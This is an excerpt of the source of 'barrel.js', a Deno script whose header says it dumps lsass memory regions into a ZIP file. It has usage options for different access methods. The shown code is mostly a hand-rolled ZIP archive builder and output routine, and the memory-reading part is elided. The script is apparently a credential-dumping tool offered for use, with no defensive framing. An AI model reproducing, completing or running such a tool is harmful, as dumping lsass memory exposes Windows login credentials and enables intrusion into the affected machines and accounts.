...
// barrel.js — Dump lsass memory regions to barrel.zip (Deno, zero deps)
// Usage: deno run --allow-ffi --allow-write barrel.js [-o disk|knowndlls|debugproc] [-p path]
...
async function buildZip(entries) {
  ...
  for (const p of prep) { localSize += 30 + p.nameBytes.length + p.compressed.length; cdSize += 46 + p.nameBytes.length; }
  ...
  for (const p of prep) {
    ...
    dv.setUint16(lo, 20, true); lo += 2; dv.setUint16(lo, 0, true); lo += 2;
    dv.setUint16(lo, 8, true); lo += 2; dv.setUint16(lo, 0, true); lo += 2; dv.setUint16(lo, 0, true); lo += 2;
    dv.setUint32(lo, p.crc, true); lo += 4;
    dv.setUint32(lo, p.compressed.length, true); lo += 4;
    dv.setUint32(lo, p.raw.length, true); lo += 4;
    dv.setUint16(lo, p.nameBytes.length, true); lo += 2; dv.setUint16(lo, 0, true); lo += 2;
  ...
  for (let i = 0; i < prep.length; i++) {
    ...
    dv.setUint16(co, 20, true); co += 2; dv.setUint16(co, 20, true); co += 2;
    dv.setUint16(co, 0, true); co += 2; dv.setUint16(co, 8, true); co += 2;
    dv.setUint16(co, 0, true); co += 2; dv.setUint16(co, 0, true); co += 2;
    dv.setUint32(co, p.crc, true); co += 4;
    dv.setUint32(co, p.compressed.length, true); co += 4;
    dv.setUint32(co, p.raw.length, true); co += 4;
    dv.setUint16(co, p.nameBytes.length, true); co += 2; dv.setUint16(co, 0, true); co += 2;
    dv.setUint16(co, 0, true); co += 2; dv.setUint16(co, 0, true); co += 2;
    dv.setUint16(co, 0, true); co += 2; dv.setUint32(co, 0, true); co += 4;
    dv.setUint32(co, offsets[i], true); co += 4;
    out.set(p.nameBytes, co); co += p.nameBytes.length;
  }
  dv.setUint32(co, 0x06054b50, true);
  dv.setUint16(co + 4, 0, true); dv.setUint16(co + 6, 0, true);
  dv.setUint16(co + 8, prep.length, true); dv.setUint16(co + 10, prep.length, true);
  dv.setUint32(co + 12, cdSize, true); dv.setUint32(co + 16, localSize, true);
...
async function main() {
  ...
  const rnd = (len) => { let s = ""; for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * chars.length)]; return s; };
  ...
  Deno.writeTextFileSync("barrel.json", JSON.stringify(mem64list));
  console.log("[+] File barrel.json generated.");

  const zipData = await buildZip(files);
  Deno.writeFileSync("barrel.zip", zipData);
  console.log("[+] File barrel.zip generated.");
}
